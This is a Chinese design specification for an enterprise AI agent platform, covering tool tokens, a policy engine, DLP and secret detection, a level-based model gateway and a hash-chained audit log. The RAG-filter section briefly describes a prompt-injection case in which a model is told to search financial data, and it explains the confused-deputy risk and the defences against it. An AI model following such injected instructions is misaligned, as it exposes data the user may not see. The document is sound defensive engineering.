    # 内容：iss="corpai", aud="mcp:<domain>"（只对这个 MCP 服务器有效）, sub=真人的 user_id,
    #       act={"sub": "agent:<agent>"}（代表他行事的 Agent）, scope="tool_a tool_b"（允许调用的工具）,
    #       run_id, jti, iat, exp ；密钥 = $DATA/secrets/tool.key
def verify_tool_token(token: str, *, domain: str) -> ToolClaims      # aud / 过期 / 签名不对时抛 TokenError
def require_scope(claims: ToolClaims, tool: str) -> None              # 工具不在 scope 里时抛 NotInScope
def mint_gateway_token(principal, *, agent, run_id, floor: Level, ttl_s=900) -> str   # aud="gateway"；密钥 = $DATA/secrets/gateway.key
def verify_gateway_token(token) -> GatewayClaims                      # (sub, agent, run_id, floor, jti, iat, exp)
```

每种令牌用自己的密钥，泄露了工具令牌的密钥也伪造不了网关令牌。有效期有上限：工具令牌 600 秒、网关令牌 3600 秒、登录会话 8 小时；签发时超过上限直接报错，校验时 exp − iat 超过上限也不通过，即使签名有效。算法固定为 HS256（拒绝 `alg=none`），格式不对的 claims 一律拒绝，停用账号签发不了令牌。错误类型：`TokenError` 下有 `TokenExpired`、`WrongAudience`、`BadSignature`、`NotInScope`、`SessionRevoked`；错误信息都是固定文字，并用 `from None` 抛出，所以令牌原文不会出现在错误信息里。

令牌原文永远不进入图的 state、checkpoint、trace 和审计详情（审计只记 `jti`）。子 Agent 用自己的工具清单单独换令牌，绝不复用父 Agent 的令牌。

💡 **为什么每次调用换一个短期令牌**：这就是设计评审里说的防“混淆代理人”（confused deputy）：如果 MCP 服务器只认一个高权限服务账号，低权限用户就能借 Agent 之手拿到自己无权看的数据。MCP 服务器从令牌里知道“真人是谁、哪个 Agent 在代办、只允许调哪个工具”，按真人的权限查数据。即使令牌泄露，也只在它的有效期内（默认 60 秒，上限 600 秒）对这一个服务器有效，而且只能调用 scope 里列出的工具（McpClient 每次只放一个）。注意令牌不是一次性的，有效期内可以重复使用，所以寿命要尽量短。

💡 校验时也检查有效期上限，是为了兜住签发那一侧的错误：签发代码有 bug、签出一个超长有效期的令牌时，校验这一关也不认（iat 也不能在未来，PyJWT 会拒绝）。注意它防不住密钥泄露：拿到密钥的人随时能签出合规的短期令牌，这时只能删掉密钥文件，让这一类令牌全部失效（见实现说明）。

## 6. 策略（A3）

只有一个入口，按规则表决定，默认拒绝，而且是纯函数：它自己不写审计，由调用方把决定记成 `policy_decision` 事件。`corpai/policy/rules.py` 里是几张规则表：`DENY_RULES` 和 `ALLOW_RULES` 的每条是 `Rule(id, kinds, actions, roles_or_pred, effect, reason, field_mask, obligations)`，`DERIVED` 的每条是 `Derived(action, from_action, rule_id, obligations)`，`TOOL_RULES` 的每条是 `ToolRule(id, domain, tools, who(p, agent), reason)`（`tools` 为 None 表示该领域的全部工具），`PURPOSES` 是“用途 → (集合函数, min_trust)”；这些值类型定义在 `corpai/policy/model.py`。`corpai/policy/engine.py` 提供：

```python
def decide(p: Principal, action: Action | str, r: Resource) -> Decision
def rag_filter(p: Principal, *, purpose: str) -> RagFilter
    # RagFilter(collections: frozenset[str], max_level: Level, groups: frozenset[str],
    #           min_trust: Trust | None, current_only: bool = True)
def tool_allowed(p: Principal, agent: str, domain: str, tool: str) -> Decision
    # = 工具在工具清单里 ∩ 这个 Agent 的白名单（config/agents.yaml）∩ 用户能启动这个 Agent ∩ 有一条工具规则允许这个用户；
    #   令牌的 scope 由 MCP 服务器检查
def can_approve(p: Principal, proposal: ProposalView) -> Decision
    # ProposalView(requester_id, domain, tool, tier: ToolTier)；ProposalView.from_attrs(mapping) -> ProposalView | None
def may_start(p, agent) -> Decision;  def apps_for(p) -> list[str];  def tool_tier(domain, tool) -> ToolTier | None
```

**`decide()` 的判定顺序**：拒绝规则（命中任何一条即拒绝）→ 未知的资源种类默认拒绝 → 派生动作（`EXPORT` = 能 `READ`，再附加 `watermark` 义务）→ 第一条匹配的允许规则 → `default-deny`，并说明具体原因（是级别不够还是 ACL 组不对）。每个 `Decision` 都带 `rule_id` 和一句看得懂的原因。

- 拒绝规则：`deny-inactive`（停用账号，任何种类、任何动作）；`deny-ops-roles-confidential`（平台管理员和安全审计员对 L3 及以上的带标签数据做 READ、SEARCH、EXPORT、PROPOSE）。
- 带标签的种类：`label-acl`（READ、SEARCH，等同 `core.can_read`）；`propose-on-readable`（能 READ 才能 PROPOSE；之后照样要过工具规则和审批）。
- `audit`：安全审计员可以 READ、SEARCH。`trace`（attrs 带 `owner_id`、`dept`）：这次运行的主人；运行所属部门的 `head:<dept>`（附 `aggregate_only`；CEO 作为总裁办负责人，只能看 exec 部门）；平台管理员（附 `metadata_only`）。`admin.outage_switch`、`admin.budget`：平台管理员可以 READ 和 ADMIN。`report`（attrs 带 `domain`，只有 READ）：CEO；部门负责人（角色 manager）在 `attrs.domain` 等于自己的部门值（`sales`、`eng`、`legal`、`finance`、`hr`）时可读，用的不是 MCP 领域名（`crm`、`code`、`hris` 永远对不上）。`proposal`（attrs 带 `requester_id, domain, tool, tier`）：请求人可以 READ；`can_approve` 允许的人可以 READ 和 APPROVE。
- `hr.aggregate`（attrs 带 `dept`、`topic`；全部附加 `aggregate_only`、`min_group_5`）：`hr-aggregate-ceo`（CEO）；`hr-aggregate-hr-head`（HR 部门的 manager，持有 `head:hr`）；`hr-aggregate-head-own-headcount`（部门负责人，只限本部门（`attrs.dept` 是自己的部门）的编制人数（`attrs.topic` = `headcount`））。任何部门的薪酬、绩效汇总都只给 CEO 和 HR 负责人。

💡 汇总数据也能反推出个人：一个只有 3 个人的组，平均薪资几乎就是每个人的薪资。所以 HR 汇总一律附带 `min_group_5`（少于 5 人的分组不展示），薪酬和绩效的汇总只给 CEO 和 HR 负责人，其他负责人只能看自己部门有多少人。

**资源种类**：带标签的：`doc`、`rag.chunk`、`playbook`、`web.page`、`crm.account`、`crm.contact`、`crm.opportunity`、`crm.interaction`、`crm.quote`、`eng.project`、`eng.ticket`、`eng.ci_run`、`eng.vuln`、`eng.repo_doc`、`legal.contract`、`legal.contract_request`、`legal.matter`、`legal.regulation`、`legal.clause`、`fin.ledger`、`fin.invoice`、`fin.budget`、`fin.statement`、`fin.metric`、`hr.employee`、`hr.compensation`、`hr.performance`、`hr.requisition`、`hr.requisition_budget`、`hr.candidate`、`hr.screening`。没有标签的：`audit`、`trace`、`proposal`、`report`、`hr.aggregate`、`admin.outage_switch`、`admin.budget`。其他种类一律拒绝。

**工具规则**（`TOOL_RULES`，第一条匹配的规则放行。“真人”指在职、非服务账号的用户；运维角色指平台管理员和安全审计员，他们不会因为所属部门而被放行）：

| 领域 | 谁能用 |
|---|---|
| crm | 销售部门和 CEO：全部工具；持有任何 `grant:crm:` 组的法务员工：`get_account` |
| code | 技术部门和 CEO：全部工具；销售：`get_project_status` |
| docs | 所有真人（具体能看哪些行由 RLS 过滤） |
| finance | 财务部门和 CEO：全部工具；运维角色以外的所有真人：`list_metrics`、`get_metric`（已发布的指标；每个指标再按自己的标签过一次 `decide()`） |
| hris | HR 部门：全部工具；部门负责人：`headcount`、`list_requisitions`、`get_employee`；CEO：`headcount`、`list_requisitions` |
| legal | 法务部门和 CEO：全部工具；运维角色以外的所有真人：`search_regulations` |
| web | 销售和 CEO，而且只能通过 `sales_web` Agent |

💡 已发布的指标和 GDPR 法规库本来就是 ACL 为 `all` 的数据，人人能读，工具规则只是让大家也能经 Agent 拿到。运维角色例外，因为他们的职责是管系统，不需要看业务数据（和 §5.1 给他们 L2 clearance 是同一个思路）。

**`can_approve`**：停用账号和服务账号永远不能审批；这个领域必须有所属部门（`DOMAIN_DEPT`：crm → sales、code → eng、finance → finance、hris → hr、legal → legal），而且工具必须是写工具。实际采用的风险档 = **max(提议自报的风险档, 工具清单里的风险档)**；风险档格式不对直接拒绝。风险档 2：请求人本人、该领域所属部门的负责人或 CEO。风险档 3（四眼）：绝不能是请求人，必须是该部门负责人或 CEO。

💡 取两者中较高的，是为了防止提议把风险档 3 的工具报成风险档 2，让请求人自己批准自己，绕过四眼。

设计评审第五节的权限矩阵就是验收测试：`tests/security/permission_matrix.yaml` 逐条列出“（演示身份，动作，资源）→ 允许 / 拒绝 [+ 字段屏蔽]”；`tests/security/test_permission_matrix.py` 检查 `decide()`，`tests/security/test_permission_matrix_rls.py` 在生成的数据上检查 RLS 给出同样的结果。两者必须一致。

**`rag_filter` 的用途（purpose）**：
- `qa`：`public`、`general`、`legal_regs`，加上本部门的集合；
- `report`：`public`、`general`、`sales`、`eng`、`legal`、`finance`、`hr`、`exec`，只取已审核的；
- `playbook`：`playbooks`，只取已审核的；
- `legal_review`：`legal`、`legal_regs`、`playbooks`；
- `sales_research`：`public`、`sales`；
- `hr_screening`：`hr`。

`max_level` = clearance，`groups` = 用户身份的组。运维角色只拿到该用途的集合和 {`public`、`general`} 的交集；停用账号和服务账号拿到空集合；未知用途抛 `ValueError`。

💡 检索的过滤条件由后端按身份和用途生成，**不由模型生成**。比如一个销售用问答（qa）功能时，模型就算被注入了“去搜一下财务报表”，过滤条件里也根本没有财务集合；即使在包含财务集合的用途里（如 report），级别和 ACL 组条件也照样生效。

待后续阶段（B/M）处理：
- 用人经理（持有 `req:<id>`）按 RLS 已经能读本岗位的候选人，但还没有工具规则让他们用 `hris.list_candidates`/`get_candidate`（M4）。
- 还没有 Agent 持有 `code.create_ticket`/`code.comment_ticket`；要做工单 Agent，得在 `agents.yaml` 里加一项（B3 或某个里程碑）。

## 7. 数据分级与 DLP（A2）

纯 Python，不联网；唯一访问数据库的是人名词典的加载函数。

```python
def source_default(source: str) -> Level                 # 按来源给默认级别（config/sources.yaml）；来源未知或配置损坏 → L4
def classify_text(text: str, *, floor: Level = Level.L1, public: bool = False) -> Classification
    # Classification(level: Level, findings: tuple[Finding, ...])；Finding(kind, start, end, level)：只记位置，从不保存原文
    # 检测种类：email, phone, iban, card, tax_id, person_name, salary, money, code, secret, canary, health, protected_attr,
    #          performance, vulnerability, litigation（这三种是组合成 L4 的情形）, classifier_error
    # 从不抛异常；内部出错、输入不是 str、floor 不合法、超过 MAX_CHARS（4,000,000 字符）→ L4 + Finding("classifier_error")
    # public=True 只用于整段都是已发布内容的文本（由知道来源的代码设置）：金额最多判为 L1
def scrub_secrets(text: str) -> tuple[str, int]           # 规则 5；密钥换成 "[REDACTED:<kind>]"；key=value 形式保留 key；重复执行结果不变
def dlp_scan(text: str, *, route: Route | str, public: bool = False) -> DlpResult   # 级别 >= L3 且线路不是 local 时拦截；未知线路按 external 处理
def mask_for_level(text: str, level: Level | int) -> str | None
    # 实际级别 = max(level, classify_text(text).level)：<= L2 原样返回；L3 → 每个 L3 及以上的片段换成 "⟨kind⟩"，
    # 再执行 scrub_secrets；L4、级别不合法或 text 为 None → None
def redact_protected(text: str) -> tuple[str, list[Finding]]
    # 筛选前处理简历（D6，支持英、德、中）：命中的片段换成 "⟨removed:<kind>⟩"。种类：照片、性别（包括称谓和英文代词）、
    # 年龄、出生日期、族裔、国籍、籍贯出身、婚姻状况、子女、宗教、健康、残障
def set_gazetteer(names) -> int;  def gazetteer_size() -> int
def load_gazetteer(conn) -> int;  def load_gazetteer_from_db() -> int   # 用表主人连接；失败抛 GazetteerError
```

各种内容的级别：
- L3：email、电话、有效的 IBAN（mod-97 校验）、银行卡号（Luhn 校验）、旁边有上下文词的德国税号（Steuer-ID）、中国居民身份证号、人名、受保护属性和健康信息（必须是关于某个人的陈述，单纯提到这个话题不算）、出现在商业语境里的金额、带公司内部标识的代码；
- L2：单独出现的金额、其他代码；
- L4：薪资、绩效、安全漏洞和诉讼相关的组合、密钥、金丝雀。

密钥种类：`private_key`、`jwt`、`openai_key`、`aws_key`、`github_token`、`slack_token`、`google_key`、`stripe_key`、`bearer`、`password`（密码也认德文和中文的标签）。

**规范化**：文本里有零宽字符、双向控制符等格式字符，或者软连字符、全角 ASCII 时，会再扫描一遍：逐个字符做 NFKC 规范化并去掉格式字符，再把命中位置映射回原文（`corpai/classify/normalise.py`）。`classify_text`、`scrub_secrets`、`redact_protected` 共用这一步，所以三者对隐藏内容的判断永远一致。

💡 在密钥或人名中间插一个零宽字符，或者改用全角字母，人眼看着一模一样，正则却匹配不上。第二遍扫描专门对付这种伪装。三个函数共用同一套规范化，就不会出现“分类器说没有密钥，清除函数却清掉了一个”这种自相矛盾。

**`config/sources.yaml`**：格式是 `sources: [{pattern, level}]`，级别写成 `L1`…`L4`。pattern 是 shell 风格的通配符，先去掉 `:<id>` 后缀（`crm.account:A-0012` → `crm.account`）再按不区分大小写匹配，**第一条匹配的生效**（所以具体的写在前、笼统的写在后）。它覆盖数据表来源、资源种类、RAG 集合名，以及 synth 语料的来源（`<collection>.<kind>`，例如 `eng.wiki` L2、`playbook.internal` L2、`playbook` L3）；每份 synth 文档按来源得到的默认级别都等于它 YAML 头部写的级别（埋了金丝雀的文档，内容检测出的级别会更高）。

**人名**：一份人名词典，从 `core.users`（不含服务账号）、`crm.contacts`、`hr.candidates` 加载（`load_gazetteer(conn)`）。拉丁字母的名字按整词、区分大小写匹配（至少 2 个词）；中日韩名字不看词边界（至少 2 个字）；另加称谓启发式（"Mr"、"Mrs"、"Ms"、"Dr"、"Prof"、"Herr"、"Frau"，可带句点，中间还可以再加一个 "Dr"/"Prof"，后面紧跟一个或两个大写开头的词，例如 “Mr Hargreaves”、“Frau Schneider”）。词典是进程级的全局变量，启动时为空。加载**要么全部成功，要么什么都不变**：任何一张表不存在、没有姓名列或读不了，就抛 `GazetteerError`，继续用之前的词典。词典为空（`gazetteer_size() == 0`）时，网关 fail-closed（§8 第 2 条）。金丝雀字符串格式是 `KB-CANARY-[0-9A-F]{8}`，一律判为 L4。

💡 **fail-closed（出错时按最严的情况处理）体现在这里**：分类器出任何错都返回 L4，请求就只能走 `local`。宁可多走本地，不能因为一个 bug 把机密发出去。人名词典也一样：只加载了一半（比如候选人表读不到），候选人的名字就会被当成普通文字，含候选人姓名的内容可能被判成 L2 发往外部。所以加载失败时宁可报错、保留旧词典；词典为空时，网关把一切至少当作 L3。

💡 `public=True` 是给已发布页面开的口子：官网、新闻稿里常有价格和融资金额，按“商业语境里的金额”会被判成 L3，销售画像（D5，只用公司公开信息）就没法走 `external`。只有知道来源的运行时代码能声明“这段全是公开内容”，模型不能。

待后续阶段（B/M）处理：
- 在 API 启动（lifespan）时加载人名词典（`load_gazetteer_from_db()`，B3），并在每次导入或重新生成数据后刷新（B1）。

## 8. 模型网关（A4）

Agent 不持有任何 API key。所有模型调用都经过 `corpai/gateway`。

```python
@dataclass class ChatRequest:
    messages: list[dict]            # OpenAI 消息格式
    principal: Principal
    hwm: Level                      # 由运行时辅助函数从图的 state 取，绝不来自模型输出
    purpose: str                    # 用途，例如 "qa.answer"、"legal.review"、"sales.web_extract"
    run_id: str
    agent: str
    json_mode: bool = False
    max_tokens: int = 1200          # 不超过 models.yaml 的 max_tokens_cap
    temperature: float = 0.2
    tools: list[dict] | None = None
    public_only: bool = False       # 只能由运行时代码设置：每条消息都是已发布内容；只在 hwm == L1 时生效

@dataclass class ChatResult:
    text: str; tool_calls: list[dict]; route: Route; model: str; level: Level
    usage: dict; latency_ms: int; audit_seq: int

class ModelGateway:
    def __init__(self, backend: Backend, *, config: GatewayConfig | None = None, tracer=None)
    async def chat(self, req: ChatRequest) -> ChatResult
def get_gateway() -> ModelGateway   # 按 CORPAI_LLM 模式返回进程级单例（FakeLLM / OpenAICompatBackend）
```

`chat` 可能抛出：`PermissionError`（用户已停用）、`ValueError`（请求格式不对）、`SecretDetected`、`LocalUnavailable`、`ExternalUnavailable`、`GatewayBusy`、`BudgetExceeded`、`BackendError`（重试用完之后；带 `.status`、`.retryable`）、`MissingApiKey`（只说出环境变量名）、`EgressDenied`。除前两个外都是 `GatewayError` 的子类，错误信息是固定文字，从不引用消息原文、后端返回的内容或 key。

`chat` 内部按以下顺序执行：

1. 对消息和工具定义里的每个字符串（包括 dict 的键）执行 `scrub_secrets`。两条线路都做；不修改调用方传入的对象。
2. `level = max(req.hwm, classify_text(消息里的每个字符串、数字和 dict 键).level)`；hwm 不合法或分类器出错 → L4。`public_only`（且 hwm 为 L1）时传 `public=True`。人名词典还没加载时，`level` 至少抬到 L3（理由 `gazetteer_unloaded`）。
3. 选线路：只有 `level <= L2` 才走 `external`，否则走 `local`。
4. 宕机开关（`ops.get_switches()`；没有 `local_down` 这一行时按“打开”处理）：要走 `external` 而 `external_down` 打开 → 改走 `local`，理由 `external_down_fallback`（这是安全的方向）。第 5 步之后，要走 `local` 而 `local_down` 打开 → 抛 `LocalUnavailable`。**绝不**把 L3/L4 改走 `external`。
5. 只对 `external`：对消息和工具定义执行 `dlp_scan`；被拦截 → 改走 `local`，理由 `dlp_upgrade`，并记下 DLP 判出的级别（第 2 步只给消息分级，DLP 还会扫工具定义，所以这一步拦下的通常是工具定义里的敏感内容）。另外，不管哪条线路，只要清除密钥后分类仍然发现 `secret`，就拒绝调用，抛 `SecretDetected`（审计理由 `secret_unscrubbed`）。然后查出口清单（`check_egress(线路的目的地, base_url, level)`，fake 模式也查；被拒绝时审计理由 `egress_denied`）。
6. 并发：每个事件循环里每条线路一个 `asyncio.Semaphore(max_concurrency)`；最多等 `queue_timeout_s`，超时抛 `GatewayBusy`。拿到名额之后、以及每次重试之前，**都再读一次开关**：`local_down` → `LocalUnavailable`；外部调用碰上 `external_down` → `ExternalUnavailable`（这时不再改线路，由调用方重试）。
7. 预算：按部门、按 **UTC 自然日**计（`ops.budget_day()`，在 SQL 里决定；不用模拟日期）。在 `principal_tx` 里用 `ops.consume_budget(dept, tokens) -> (remaining, reservation_id)` 预留 `len(文本)/4 + 1 + max_tokens` 个 token（`dept` 必须等于 `app.dept`）；`remaining < 0` 表示什么也没预留 → `BudgetExceeded`。外部调用的 `ops.egress_log` 记录在**发送之前**、在同一个事务里写入；写不进去就不发送。调用结束后，`ops.settle_budget(reservation_id, actual)` 把预留换成实际用量（失败或取消时 `actual = 0`）：只有预留的那个用户能结算，只能结算一次，退回的量不超过预留量（`ops.budget_reservations`）。
8. 调用后端（`live` 模式用 `OpenAICompatBackend`，`fake` 模式用 `FakeLLM`；`fake` 是默认模式，测试和离线演示都用它），每次尝试有 `timeout_s` 超时；遇到 429/5xx、超时和连接错误按指数退避重试（`retry`：最多 3 次，间隔 = min(8 秒, 0.5 秒 × 2^(第几次−1))）；其他 HTTP 状态码和后端的意外异常直接按 `BackendError` 失败，不重试；live 客户端不跟随重定向。
9. 审计和 trace。每次通过请求校验的 `chat()` 恰好写一条收尾的 `model_call` 记录（decision 是 `allow`/`deny`/`error`；理由是 `route_by_level`、`gazetteer_unloaded`、`external_down_fallback`、`dlp_upgrade`、`secret_unscrubbed`、`local_down`、`external_down`、`gateway_busy`、`egress_denied`、`backend_error`、`cancelled` 之一），预算不足时改写一条 `budget_exceeded`。例外：在等并发名额时被取消，或者 `ops.get_switches`/`ops.reserve_and_log`/`ops.settle` 抛出数据库错误（即使后端调用已经成功），都不会留下收尾记录。理由不是 `route_by_level` 时，前面还有一条 `route_decision` 记录（decision `reroute`）。审计详情只放元数据（hwm、内容级别、检测到的种类、清除了几处密钥、用量、耗时、尝试次数、`egress_id`），从不放消息原文。整个调用包在一个按级别脱敏的 `llm` trace span 里。调用被取消（`CancelledError`）时，会执行一段受保护（shield，不会被再次取消）的清理：退回预留，并写一条带 `egress_id` 的 `model_call`（`error/cancelled`）。

💡 **排队之后为什么要再读开关**：一个 local 请求可能在队列里等上 20 秒（external 最多等 5 秒），这期间管理员也许已经打开了“本地宕机”或“外部宕机”开关。只在开头读一次的话，排队中的请求照样会发出去。

💡 **为什么先写出口记录再发送**：先发后记，一旦发送成功而记录没写进去（或者进程正好崩溃），就多了一次没有记账的外发。先记后发，最坏的情况只是“记了但没发”，对审计来说可以接受。

💡 **预算为什么先预留再结算**：调用前不知道实际会用多少 token。先按上限预留，并发的请求就不会一起把预算冲破；结束后再按实际用量退回多余的部分。按 UTC 自然日计，是因为模拟日期固定不变，按它计的话预算永远不会翻到第二天（见 §3 “两个时钟”）。

配置 `config/models.yaml`：

```yaml
routes:
  local:    {base_url: https://api.deepseek.com, model: deepseek-flash, api_key_env: DEEPSEEK_API_KEY,
             max_concurrency: 2, queue_timeout_s: 20, timeout_s: 90, simulated_onprem: true, egress: model.local}
  external: {base_url: https://api.deepseek.com, model: deepseek-flash, api_key_env: DEEPSEEK_API_KEY,
             max_concurrency: 8, queue_timeout_s: 5, timeout_s: 60, egress: model.external}
extra_body: {thinking: {type: disabled}}
retry: {max_attempts: 3, base_delay_s: 0.5, max_delay_s: 8}
max_tokens_cap: 4096
```

每日限额在 `ops.budget_defaults` 里（按部门设，`'*'` 是兜底值，200 万 token）；`ops.budgets` 记录（dept, day, tokens_used, token_limit）。把 `local` 换成真正的内网模型，只需要改它的 `base_url`、`model` 和对应的出口清单条目。API key 在调用时才从环境变量读取，放进一个只用于这一次调用的客户端（不复用连接），绝不写进日志。`OpenAICompatBackend` 只接受 `https`，忽略代理相关的环境变量（`trust_env=False`），`max_retries=0`（重试由网关自己做），并且只按状态码和异常类型重新构造供应商的错误，不把原异常串在后面。

💡 `local` 的并发上限故意设得比 `external` 小（2 对 8），用来模拟“内网模型算力有限”。演示“本地宕机”时，L3 请求会明确报错，而不是悄悄改走外部 API，这是整套路由设计最关键的一条。

💡 原始异常里可能带着请求内容甚至 key 的片段，重新构造一个只有状态码的异常，它们就不会顺着异常链进入日志。`trust_env=False` 则防止环境里的代理变量把流量引到出口清单之外的主机。

**FakeLLM（假模型）**：`corpai.gateway.fake_llm()` 返回 `CORPAI_LLM=fake` 时使用的进程级单例，输出是确定的。各功能模块按用途前缀注册应答函数：`fake.register("qa.", fn)`（前缀最长的优先；`unregister(prefix)` 取消注册），其中 `fn(messages, *, route, json_mode) -> str | {"content": str, "tool_calls": [...]}`，同步异步都行，也可以抛 `RetryableBackendError` 来模拟可重试的错误。默认应答是 `"[fake/<线路>] "` 加一段简短回显，引用上下文里出现的 `[doc:…]` 标记（`json_mode` 时返回 JSON）。每次调用都记在 `FakeLLM.calls` 里（线路、级别、用途、清除密钥后的消息、json_mode、tools、max_tokens、temperature），供测试断言。后端协议：`async complete(call: BackendCall, cfg: RouteConfig, *, extra_body=None) -> BackendReply(text, tool_calls, usage, model)`；`BackendCall` 带线路、级别、用途、消息、json_mode、max_tokens、temperature、tools，不带用户身份。

**OpenAI 兼容接口**：`corpai.gateway.openai_compat.router`，提供 `POST /v1/chat/completions`，用网关令牌（`mint_gateway_token`）作为 Bearer key 认证。用户身份从目录重新读取（已停用 → 401）；令牌的任何问题都返回同一个 401 响应体。令牌里的 `floor` 就是这次调用的 `hwm`，`purpose = "compat.<agent>"`，请求体里的 `model` 被忽略。`stream=true` 直接返回 400。错误码：400 请求体不对或 `secret_detected`；413 请求体超过 4 MiB；`chat()` 抛 `PermissionError` 时返回 401（和令牌无效时同一个响应体）；503 `local_unavailable`（Retry-After 60）、`external_unavailable` 和 `gateway_busy`（Retry-After 5）；429 `budget_exceeded`；502 `backend_error`，其他网关错误（如 `EgressDenied`、`MissingApiKey`）返回 502 `gateway_error`。响应是 OpenAI 格式，外加一个键 `"corpai": {route, level, audit_seq}`。如果 `app.state.gateway` 上设了网关，就用它代替 `get_gateway()`。这样 Clause Check 的 `OpenAICompatBackend` 不用改代码，把地址指向网关就能复用（M2）。

**出口清单** `config/egress.yaml`（`destinations:` 下每项有 `kind`（`http` | `in_process` | `simulated`）、`hosts`、`max_level`）：`model.external`（http，`api.deepseek.com`，L2）、`model.local`（http，`api.deepseek.com`，L4，模拟内网）、`search.mock`（进程内，L1）、`email.outbox`（模拟发件箱，`max_level: null`：不接受模型数据）。`egress.check_egress(destination, url, level)` 遇到以下情况抛 `EgressDenied`：目的地不在清单里、主机不在它的 `hosts` 里、URL 不是 https、级别超过 `max_level`。live 后端的 HTTP 客户端对每个请求（包括重定向）都再查一次主机。`ops.egress_log` 拒绝级别高于 L2 的 external 记录（表的 CHECK 约束和 `ops.log_egress` 各查一次）。有一个测试扫描 `corpai/` 和 `config/` 里写死的主机名，出现清单外的主机就失败。

## 9. 审计与 trace（A1）

```python
def record(event: str, *, actor: str, act_chain: Sequence[str] = (), action: str | None = None,
           resource: str | None = None, decision: str | None = None, reason: str | None = None,
           route: str | None = None, level: int | None = None, approval_id: str | None = None,
           run_id: str | None = None, details: Mapping | None = None) -> int     # 返回序号 seq
async def arecord(...) -> int                      # 同上，异步版；每个事件循环最多同时 16 个写入
def record_owner_job(job: str, details: Mapping | None = None) -> int   # 事件 owner_job，actor 是 "svc:<job>"，写完再写一个锚点
async def read_log(principal, *, after_seq: int = 0, limit: int = 200) -> list[dict]   # 只有安全审计员，否则 PermissionError；哈希以十六进制返回；limit ≤ 1000
def verify_chain(conn=None, *, anchors: Sequence[Anchor] | None = None) -> ChainReport
    # ChainReport(ok: bool, checked: int, first_bad_seq: int | None)；默认用表主人连接；
    # anchors 默认读锚点文件，传 [] 则只检查链本身
def verify_chain_sql(conn=None, *, anchors=None) -> ChainReport   # 同样的检查，经 SQL 函数 audit.verify_chain(bigint[], bytea[]) 完成
def read_anchors(path=None) -> list[Anchor];  def write_anchor(conn=None, *, path=None) -> Anchor | None   # 锚点文件有问题时抛 AnchorError
```

以下情况 `record` 抛 `ValueError`：事件名不在 `EVENTS` 里；route 不是 `local`/`external`；level 不在 1..4；内容像凭据。凭据检查分两种：一是字段名，把 camelCase 拆开后按整词匹配 token、authorization、api_key、password/passwd、secret、cookie、session、bearer、jwt、credential(s)、private_key（任意嵌套深度都查；`prompt_tokens` 能过，`access_token` 不能）；二是值，看起来像 JWT、`Bearer …`、`sk-…` 开头的 key 或 PEM 私钥的都拒绝（检查 details、reason、resource、action）。SQL 层用 `audit.has_credential_key` 对字段名再查一次。

审计表 `audit.log` 的列：`seq bigint PRIMARY KEY, ts timestamptz, actor（发起者：真人的 user_id；后台任务是 svc:<任务名>）, act_chain text[]（代办链：有哪些 Agent 在替这个人做事）, event, action, resource, decision, reason, route, level, approval_id, run_id, details jsonb, prev_hash bytea, hash bytea`。

- **哈希链**：由插入前触发器 `audit._chain_insert` 建立，所以任何写入途径都会被接上链，包括表主人直接 `INSERT`。触发器先拿 `pg_advisory_xact_lock` 锁，**然后**才分配 `seq = nextval('audit.log_seq')`（列上没有默认值，所以序号顺序就是链的顺序）和 `ts = clock_timestamp()`，读出上一条的哈希，算出 `hash = sha256(prev_hash || audit.canonical(这一行))`；第一行的 `prev_hash` 是 32 个零字节。改动或删除中间任何一行，后面的哈希都对不上。
- 只允许在 **READ COMMITTED** 隔离级别下插入（快照过时可能让链分叉）。触发器对所有人（包括表主人）拒绝 `UPDATE`、`DELETE`（行级和语句级）和 `TRUNCATE`。
- **写入**：通过 SECURITY DEFINER 函数 `audit.append(p_event, p_actor, p_act_chain, p_action, p_resource, p_decision, p_reason, p_route, p_level smallint, p_approval_id, p_run_id, p_details jsonb) -> bigint`。`corpai_app` 只能执行 `audit.append` 和 `audit.read_log`，对表、序列和 `audit.verify_chain` 都没有任何权限。
- 审计用**独立的自动提交连接**写入，所以即使业务事务回滚了，“被拒绝访问”这条记录也还在。
- 只有安全审计员能读：`audit.read_log(after_seq, lim)` 要求 `cur_role() = 'security_auditor'` 而且组里有 `role:security_auditor`（API `GET /api/audit`）。

💡 **为什么锁住之后才分配序号**：如果 seq 用列默认值，序号在拿锁之前就分好了。两个并发写入，A 拿到 10、B 拿到 11，结果 B 先抢到锁、先接上链，链的顺序就和序号对不上。在触发器里拿到锁再分配，序号顺序就等于链的顺序。只允许 READ COMMITTED，是因为在 REPEATABLE READ 下事务看到的是开始时的快照，读到的“最后一条哈希”可能已经过时，两个事务就会接在同一条后面，链分了叉。

**规范序列化格式**（canonical form，SQL 里是 `audit.canonical`，Python 里在 `corpai/audit/chain.py`；有测试核对两边算出的字节完全相同）：先写前缀 `corpai.audit.v1`，然后每个字段带长度前缀：NULL → `0x00`；文本 → `0x01` + 8 字节大端整数表示的 UTF-8 字节长度 + UTF-8 字节。字段顺序：seq、ts（以 epoch 微秒表示）、actor、`cardinality(act_chain)` 后跟每个元素、event、action、resource、decision、reason、route、level、approval_id、run_id、`details::text`。整数写成十进制文本。

💡 为什么不用 JSON：JSON 的键顺序、数字格式、转义方式在不同实现之间很容易不一致，Python 和 Postgres 算出的字节差一点，哈希就全对不上。长度前缀格式规则简单，两边都能精确复现；NULL 和空字符串也区分得开。

**锚点**：单靠链，发现不了“末尾被砍掉几条”，也发现不了表主人把历史改掉之后整条重新算哈希。`write_anchor` 把链头 `(seq, hash, ts)` 追加到 `$DATA/audit_anchors.jsonl`，并用 `$DATA/secrets/audit_anchor.key` 做 HMAC-SHA256 签名（这两个文件任何数据库角色都碰不到）；每次 `record_owner_job` 都会写一个锚点。`verify_chain` 还要求每个锚点记下的那个 seq 仍然存在，而且哈希完全一致；否则 `first_bad_seq` 是最后一个对得上的锚点的下一条。锚点文件被改过会抛 `AnchorError`。最新锚点之后追加的行，仍然可能被删掉而不被发现。

💡 链只能证明“现有的行彼此首尾相接”。删掉最新的几条，剩下的照样首尾相接；表主人甚至可以改掉中间某行，再把后面的哈希全部重算一遍。锚点把某一刻的链头存到数据库之外，并且签了名，数据库里的人改不了它，这两种篡改就都露馅了。剩下的缺口是最新锚点之后的那一段，所以每次 `record_owner_job` 都会补一个锚点；真实部署时，锚点还应送到数据库主机写不了的存储上（§17）。

